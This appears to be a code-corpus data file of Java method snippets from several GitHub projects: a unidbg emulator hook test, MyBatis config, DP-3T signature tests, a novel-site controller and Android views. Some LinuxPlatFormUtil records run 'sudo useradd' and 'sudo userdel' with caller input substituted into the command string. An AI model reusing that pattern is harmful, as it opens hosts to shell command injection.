hookZz.wrap(unpack_dq, new WrapCallback<HookZzArm32RegisterContext>() {\n            @Override\n            public void preCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                Pointer pointer = ctx.getPointerArg(0);\n                Pointer data = pointer.getPointer(0);\n                Pointer end = ctx.getPointerArg(1);\n                ctx.push(data);\n                ctx.push(end);\n            }\n            @Override\n            public void postCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                super.postCall(emulator, ctx, info);\n                UnicornPointer end = ctx.pop();\n                UnicornPointer data = ctx.pop();\n                long low = ctx.getR0Int();\n                long high = ctx.getR1Int();\n                long value = (high << 32) | low;\n                int size = (int) (end.toUIntPeer() - data.toUIntPeer());\n                byte[] bytes = data.getByteArray(0, size);\n                long my = Utils.unpack_dq(ByteBuffer.wrap(bytes));\n                if (value != my) {\n                    Inspector.inspect(bytes, \"unpack_dq data=\" + data + \", value=0x\" + Long.toHexString(value) + \", LR=\" + ctx.getLRPointer());\n                }\n            }\n        });\n//        emulator.traceWrite(0x804c538, 0x804c538 + 15);\n\n//        emulator.attach().addBreakPoint(null, 0x40066A58);\n        Logger.getLogger(\"com.github.unidbg.AbstractEmulator\").setLevel(Level.DEBUG);\n\n        System.err.println(\"exit code: \" + module.callEntry(emulator, \"--verbose\"));\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/test/java/com/github/unidbg/android/ida/AndroidServerTest.java", "stars": "16", "class_props": {"extends": null, "implements": ["IOResolver", "PTrace"], "modifiers": ["public"]}}, {"id": 57938, "method_name": "dataSource", "class_name": "MybatisPlusConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataSource", "snippet": "    public DataSource dataSource() {\n        return DruidDataSourceBuilder.create().build();\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/config/MybatisPlusConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57939, "method_name": "transactionManager", "class_name": "MybatisPlusConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataSourceTransactionManager", "snippet": "    public DataSourceTransactionManager transactionManager(){\n        return new DataSourceTransactionManager(dataSource());\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/config/MybatisPlusConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57940, "method_name": "paginationInterceptor", "class_name": "MybatisPlusConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PaginationInterceptor", "snippet": "    public PaginationInterceptor paginationInterceptor(){\n        PaginationInterceptor paginationInterceptor = new PaginationInterceptor();\n        // \u5f00\u542f count \u7684 join \u4f18\u5316,\u53ea\u9488\u5bf9\u90e8\u5206 left join\n        paginationInterceptor.setCountSqlParser(new JsqlParserCountOptimize(true));\n        return paginationInterceptor;\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/common/config/MybatisPlusConfig.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57941, "method_name": "testSignaturResponseWrapper", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testSignaturResponseWrapper() throws IOException, NoSuchAlgorithmException {\n\n\t\tresponse = new MockHttpServletResponse();\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tKeyPair wrongKey = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, true);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tsignatureResponseWrapper.flushBuffer();\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tString rawJWT = response.getHeader(\"Signature\");\n\t\tassertNotNull(digest);\n\t\tString expected = \"sha-256=\"\n\t\t\t\t+ Hex.encodeHexString(MessageDigest.getInstance(\"SHA-256\").digest(\"TEST\".getBytes()));\n\t\tassertEquals(expected, digest);\n\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57942, "method_name": "testSignatureViaOutput", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testSignatureViaOutput() throws IOException, NoSuchAlgorithmException {\n\t\tresponse = new MockHttpServletResponse();\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tKeyPair wrongKey = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, true);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tOutputStream stream = OutputStream.nullOutputStream();\n\t\tsignatureResponseWrapper.outputData(stream);\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tString rawJWT = response.getHeader(\"Signature\");\n\t\tassertNotNull(digest);\n\t\tString expected = \"sha-256=\"\n\t\t\t\t+ Hex.encodeHexString(MessageDigest.getInstance(\"SHA-256\").digest(\"TEST\".getBytes()));\n\t\tassertEquals(expected, digest);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57943, "method_name": "testBatchReleaseTime", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testBatchReleaseTime() throws IOException, NoSuchAlgorithmException {\n\t\tresponse = new MockHttpServletResponse();\n\t\tresponse.setHeader(\"X-BATCH-RELEASE-TIME\",\n\t\t\t\tLong.toString(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli()));\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tKeyPair wrongKey = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, true);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tsignatureResponseWrapper.flushBuffer();\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tString rawJWT = response.getHeader(\"Signature\");\n\t\tJwtParser jwtParser = Jwts.parserBuilder().setSigningKey(keyPair.getPublic()).build();\n\t\tJwt jwt = jwtParser.parse(rawJWT);\n\n\t\tassertTrue(response.containsHeader(\"X-BATCH-RELEASE-TIME\"));\n\t\tClaims claims = (Claims) jwt.getBody();\n\t\tassertTrue(claims.containsKey(\"batch-release-time\"));\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57944, "method_name": "testBatchReleaseTimeWithOutputStream", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testBatchReleaseTimeWithOutputStream() throws IOException, NoSuchAlgorithmException {\n\t\tresponse = new MockHttpServletResponse();\n\t\tresponse.setHeader(\"X-BATCH-RELEASE-TIME\",\n\t\t\t\tLong.toString(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli()));\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tKeyPair wrongKey = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, true);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tOutputStream stream = OutputStream.nullOutputStream();\n\t\tsignatureResponseWrapper.outputData(stream);\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tString rawJWT = response.getHeader(\"Signature\");\n\t\tJwtParser jwtParser = Jwts.parserBuilder().setSigningKey(keyPair.getPublic()).build();\n\t\tJwt jwt = jwtParser.parse(rawJWT);\n\n\t\tassertTrue(response.containsHeader(\"X-BATCH-RELEASE-TIME\"));\n\t\tClaims claims = (Claims) jwt.getBody();\n\t\tassertTrue(claims.containsKey(\"batch-release-time\"));\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57945, "method_name": "testSignaturResponseWrapperWithDebugHeaders", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testSignaturResponseWrapperWithDebugHeaders() throws IOException, NoSuchAlgorithmException {\n\t\tresponse = new MockHttpServletResponse();\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, true);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tsignatureResponseWrapper.flushBuffer();\n\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tassertNotNull(digest);\n\n\t\tString publicKey = response.getHeader(\"X-Public-Key\");\n\t\tassertNotNull(publicKey);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57946, "method_name": "testSignaturResponseWrapperWithoutDebugHeaders", "class_name": "SignatureResponseWrapperTest", "params": [], "throws": ["IOException", "NoSuchAlgorithmException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testSignaturResponseWrapperWithoutDebugHeaders() throws IOException, NoSuchAlgorithmException {\n\t\tresponse = new MockHttpServletResponse();\n\t\tKeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);\n\t\tList<String> protectedHeaders = new ArrayList<String>();\n\t\tprotectedHeaders.add(\"X-BATCH-RELEASE-TIME\");\n\t\tSignatureResponseWrapper signatureResponseWrapper = new SignatureResponseWrapper(response, keyPair, 21,\n\t\t\t\tprotectedHeaders, false);\n\t\tsignatureResponseWrapper.getOutputStream().print(\"TEST\");\n\t\tsignatureResponseWrapper.flushBuffer();\n\n\t\tString digest = response.getHeader(\"Digest\");\n\t\tassertNull(digest);\n\n\t\tString publicKey = response.getHeader(\"X-Public-Key\");\n\t\tassertNull(publicKey);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/security/signature/SignatureResponseWrapperTest.java", "stars": "125", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57947, "method_name": "existUser", "class_name": "LinuxPlatFormUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Triple<Boolean,Integer,Integer>", "snippet": "    public static Triple<Boolean, Integer, Integer> existUser(String username){\n        String linuxIdCommand = \"id ${userName}\";\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxIdCommand,\n                new String[]{username}));\n        if(runShell.run() == 0){\n            String result = runShell.getResult();\n            String uid = null, gid = null;\n            Matcher matcher = LINUX_USER_INFO_PATTERN.matcher(result);\n            while(matcher.find()){\n                String name = matcher.group(1);\n                if(\"uid\".equalsIgnoreCase(name)){\n                    uid = matcher.group(2);\n                }else if(\"gid\".equalsIgnoreCase(name)){\n                    gid = matcher.group(2);\n                }\n            }\n            if(StringUtils.isNotBlank(uid) && StringUtils.isNotBlank(gid)){\n                return new MutableTriple<>(true, Integer.valueOf(uid), Integer.valueOf(gid));\n            }\n        }\n        return new MutableTriple<>(false, null, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57948, "method_name": "createUser", "class_name": "LinuxPlatFormUtil", "params": ["String", "Integer", "Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "Pair<Boolean,String>", "snippet": "    public static Pair<Boolean, String> createUser(String username, Integer uid, Integer gid){\n        String linuxUserAddCommand = \"sudo useradd ${userName}\";\n        List<String> params = new ArrayList<>();\n        params.add(username);\n        if(Optional.ofNullable(uid).filter(e -> e > 0).isPresent()){\n            linuxUserAddCommand += \" -u ${uid}\";\n            params.add(String.valueOf(uid));\n        }\n        if(Optional.ofNullable(gid).filter(e -> e > 0).isPresent()){\n            linuxUserAddCommand += \" -g ${gid}\";\n            params.add(String.valueOf(gid));\n        }\n        String[] paramArray = new String[params.size()];\n        params.toArray(paramArray);\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxUserAddCommand, paramArray));\n        return runShell.run() == 0? new MutablePair<>(true, null) : new MutablePair<>(false, runShell.getResult());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57949, "method_name": "currentUser", "class_name": "LinuxPlatFormUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Pair<Integer,Integer>", "snippet": "    public static Pair<Integer, Integer> currentUser(){\n        String username = System.getProperty(\"user.name\", \"\");\n        if(StringUtils.isNotBlank(username)){\n            Triple<Boolean, Integer, Integer> triple = existUser(username);\n            if(triple.getLeft()){\n                return new MutablePair<>(triple.getMiddle(), triple.getRight());\n            }\n        }\n        return new MutablePair<>(null, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57950, "method_name": "deleteUser", "class_name": "LinuxPlatFormUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Pair<Boolean,String>", "snippet": "    public static Pair<Boolean, String> deleteUser(String username){\n        String linuxUserDeleteCommand = \"sudo userdel ${userName}\";\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxUserDeleteCommand, new String[]{username}));\n        return runShell.run() == 0?new MutablePair<>(true, null) : new MutablePair<>(false, runShell.getResult());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57951, "method_name": "listBookSetting", "class_name": "BookController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listBookSetting(){\n        return ResultBean.ok(bookService.listBookSettingVO());\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57952, "method_name": "listClickRank", "class_name": "BookController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listClickRank(){\n        return ResultBean.ok(bookService.listClickRank());\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57953, "method_name": "listNewRank", "class_name": "BookController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listNewRank(){\n        return ResultBean.ok(bookService.listNewRank());\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57954, "method_name": "listUpdateRank", "class_name": "BookController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listUpdateRank(){\n        return ResultBean.ok(bookService.listUpdateRank());\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57955, "method_name": "listBookCategory", "class_name": "BookController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listBookCategory(){\n        return ResultBean.ok(bookService.listBookCategory());\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57956, "method_name": "searchByPage", "class_name": "BookController", "params": ["BookSP", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean searchByPage(BookSP bookSP, @RequestParam(value = \"curr\", defaultValue = \"1\") int page, @RequestParam(value = \"limit\", defaultValue = \"20\") int pageSize){\n        List<BookVO> books = bookService.searchByPage(bookSP,page,pageSize);\n        return ResultBean.ok(new PageInfo<>(books));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57957, "method_name": "queryBookDetail", "class_name": "BookController", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean queryBookDetail(Long id){\n        return ResultBean.ok(bookService.queryBookDetail(id));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57958, "method_name": "listRank", "class_name": "BookController", "params": ["Byte", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listRank(@RequestParam(value = \"type\",defaultValue = \"0\") Byte type,@RequestParam(value = \"limit\",defaultValue = \"30\") Integer limit){\n        return ResultBean.ok(bookService.listRank(type,limit));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57959, "method_name": "addVisitCount", "class_name": "BookController", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean addVisitCount(Long bookId){\n        bookService.addVisitCount(bookId);\n        return ResultBean.ok();\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57960, "method_name": "queryBookIndexAbout", "class_name": "BookController", "params": ["Long", "Long"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean queryBookIndexAbout(Long bookId,Long lastBookIndexId) {\n        Map<String,Object> data = new HashMap<>(2);\n        data.put(\"bookIndexCount\",bookService.queryIndexCount(bookId));\n        String lastBookContent = bookService.queryBookContent(lastBookIndexId).getContent();\n        if(lastBookContent.length()>42){\n            lastBookContent=lastBookContent.substring(0,42);\n        }\n        data.put(\"lastBookContent\",lastBookContent);\n        return ResultBean.ok(data);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57961, "method_name": "listRecBookByCatId", "class_name": "BookController", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listRecBookByCatId(Integer catId) {\n        return ResultBean.ok(bookService.listRecBookByCatId(catId));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57962, "method_name": "listCommentByPage", "class_name": "BookController", "params": ["Long", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean listCommentByPage(@RequestParam(\"bookId\") Long bookId,@RequestParam(value = \"curr\", defaultValue = \"1\") int page, @RequestParam(value = \"limit\", defaultValue = \"5\") int pageSize) {\n        return ResultBean.ok(new PageInfo<>(bookService.listCommentByPage(null,bookId,page,pageSize)));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57963, "method_name": "addBookComment", "class_name": "BookController", "params": ["BookComment", "HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean addBookComment(BookComment comment, HttpServletRequest request) {\n        UserDetails userDetails = getUserDetails(request);\n        if (userDetails == null) {\n            return ResultBean.fail(ResponseStatus.NO_LOGIN);\n        }\n        bookService.addBookComment(userDetails.getId(),comment);\n        return ResultBean.ok();\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57964, "method_name": "queryNewIndexList", "class_name": "BookController", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "ResultBean", "snippet": "    public ResultBean queryNewIndexList(Long bookId){\n       return ResultBean.ok(bookService.queryIndexList(bookId,\"index_num desc\",10));\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/controller/BookController.java", "stars": "137", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 57965, "method_name": "init", "class_name": "SimplePagerTitleView", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init(Context context) {\n        setGravity(Gravity.CENTER);\n        int padding = UIUtil.dip2px(context, 10);\n        setPadding(padding, 0, padding, 0);\n        setSingleLine();\n        setEllipsize(TextUtils.TruncateAt.END);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57966, "method_name": "onSelected", "class_name": "SimplePagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSelected(int index, int totalCount) {\n        setTextColor(mSelectedColor);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57967, "method_name": "onDeselected", "class_name": "SimplePagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDeselected(int index, int totalCount) {\n        setTextColor(mNormalColor);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57968, "method_name": "onLeave", "class_name": "SimplePagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLeave(int index, int totalCount, float leavePercent, boolean leftToRight) {\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57969, "method_name": "onEnter", "class_name": "SimplePagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnter(int index, int totalCount, float enterPercent, boolean leftToRight) {\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57970, "method_name": "getContentLeft", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentLeft() {\n        Rect bound = new Rect();\n        String longestString = \"\";\n        if (getText().toString().contains(\"\\n\")) {\n            String[] brokenStrings = getText().toString().split(\"\\\\n\");\n            for (String each : brokenStrings) {\n                if (each.length() > longestString.length()) longestString = each;\n            }\n        } else {\n            longestString = getText().toString();\n        }\n        getPaint().getTextBounds(longestString, 0, longestString.length(), bound);\n        int contentWidth = bound.width();\n        return getLeft() + getWidth() / 2 - contentWidth / 2;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57971, "method_name": "getContentTop", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentTop() {\n        Paint.FontMetrics metrics = getPaint().getFontMetrics();\n        float contentHeight = metrics.bottom - metrics.top;\n        return (int) (getHeight() / 2 - contentHeight / 2);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57972, "method_name": "getContentRight", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentRight() {\n        Rect bound = new Rect();\n        String longestString = \"\";\n        if (getText().toString().contains(\"\\n\")) {\n            String[] brokenStrings = getText().toString().split(\"\\\\n\");\n            for (String each : brokenStrings) {\n                if (each.length() > longestString.length()) longestString = each;\n            }\n        } else {\n            longestString = getText().toString();\n        }\n        getPaint().getTextBounds(longestString, 0, longestString.length(), bound);\n        int contentWidth = bound.width();\n        return getLeft() + getWidth() / 2 + contentWidth / 2;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 57973, "method_name": "getContentBottom", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentBottom() {\n        Paint.FontMetrics metrics = getPaint().getFontMetrics();\n        float contentHeight = metrics.bottom - metrics.top;\n        return (int) (getHeight() / 2 + contentHeight / 2);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", 